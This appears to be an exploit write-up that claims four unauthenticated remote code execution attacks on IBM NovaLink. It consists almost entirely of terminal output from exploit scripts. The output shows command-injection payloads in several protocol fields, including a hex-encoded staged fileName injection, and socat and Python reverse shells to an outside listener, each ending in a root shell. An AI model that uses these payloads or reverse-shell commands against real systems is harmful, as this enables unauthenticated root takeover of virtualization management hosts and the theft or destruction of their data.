All 4 RCEs work on up to date IBM's Novalink at the time of posting. 

### Unauth RCE - Eyecatcher

```
$ python3 mob_eyecatcher_rce.py 127.0.0.1 1657 --sweep -c 'id>/tmp/EYESWEEP'
[*] route=0x5a subop=0x67  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x5a subop=0x68  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x5a subop=0x6a  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x84  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x85  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x87  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x88  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x89  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x8a  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x8b  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x8c  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x8d  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x8e  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x8f  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x90  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x93  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x94  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x95  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x96  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x97  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x98  eyeCatcher=b';id>/tmp/EYESWEEP #'
[*] route=0x78 subop=0x99  eyeCatcher=b';id>/tmp/EYESWEEP #'

$python3 mob_eyecatcher_rce.py 127.0.0.1 1657 --route 0x78 --subop 0x8a -c 'id>/tmp/o'
[*] route=0x78 subop=0x8a  inject via eyeCatcher(element[0]) = b';id>/tmp/o #'
[+] dispatched.

$ python3 mob_eyecatcher_rce.py 127.0.0.1 1657 -s 10.0.2.2:4444
[*] reverse shell -> 10.0.2.2:4444  eyeCatcher=b";socat tcp:10.0.2.2:4444 exec:'bash -li',pty,stderr,setsid,sigint,sane #"
[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444: Got connection from ::ffff:127.0.0.1 on port 48792
[*] Switching to interactive mode
<-aa95-46b1-8fc8-f3cd9d85773c/run/mc/IBM.LparCmdRM# $ cat /tmp/EYESWEEP
cat /tmp/EYESWEEP
uid=0(root) gid=0(root) groups=0(root)
<-aa95-46b1-8fc8-f3cd9d85773c/run/mc/IBM.LparCmdRM# $ cat /tmp/o
cat /tmp/o
uid=0(root) gid=0(root) groups=0(root)
<-aa95-46b1-8fc8-f3cd9d85773c/run/mc/IBM.LparCmdRM# $ whoami
whoami
root
```

### Unauth RCE - GetRemoteFile

```
$ python3 getremote_rce.py  127.0.0.1 1657 -s 10.0.2.2:4444 
[*] target 127.0.0.1:1657  McIP=127.0.0.1  reverse shell -> 10.0.2.2:4444  (6 staged writes, listener built in)                                            
[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444: Got connection from ::ffff:127.0.0.1 on port 58884
[*] [1/6] fileName = ';printf${IFS}707974686f6e33202d632027696d706f7274207074792c736f636b65742c6f733b>h;#'
[*] [2/6] fileName = ';printf${IFS}733d736f636b65742e736f636b657428293b732e636f6e6e65637428282231302e>>h;#'
[*] [3/6] fileName = ';printf${IFS}302e322e32222c3434343429293b5b6f732e6475703228732e66696c656e6f2829>>h;#'
[*] [4/6] fileName = ';printf${IFS}2c662920666f72206620696e2028302c312c32295d3b7074792e737061776e2822>>h;#'
[*] [5/6] fileName = ';printf${IFS}2f62696e2f62617368222927>>h;#'
[*] [6/6] fileName = ';xxd${IFS}-r${IFS}-p${IFS}h>r;bash${IFS}r;#'
[*] Switching to interactive mode
<-aa95-46b1-8fc8-f3cd9d85773c/run/mc/IBM.LparCmdRM# $ whoami
whoami
root
```

### Unauth RCE - Mobcodopint

```
$ python3 mobcod_rce.py 127.0.0.1 1657 -s 10.0.2.2:4444
[*] reverse shell -> 10.0.2.2:4444  poolId=b";socat tcp:10.0.2.2:4444 exec:'bash -li',pty,stderr,setsid,sigint,sane #"
[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444: Got connection from ::ffff:127.0.0.1 on port 48130
[*] Switching to interactive mode
<-aa95-46b1-8fc8-f3cd9d85773c/run/mc/IBM.LparCmdRM# $ whoami
whoami
root
```

### Unauth RCE - Mccodaction

```
$ python3 mccodaction_rce.py 127.0.0.1 1657 -s 10.0.2.2:4444
[*] target 127.0.0.1:1657  reverse shell -> 10.0.2.2:4444  (listener built in)
[*] CmdArgs = b"probeA\nsocat tcp:10.0.2.2:4444 exec:'bash -li',pty,stderr,setsid,sigint,sane\n"
[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444: Got connection from ::ffff:127.0.0.1 on port 43782
[*] Switching to interactive mode
<-aa95-46b1-8fc8-f3cd9d85773c/run/mc/IBM.LparCmdRM# $ whoami
whoami
root
```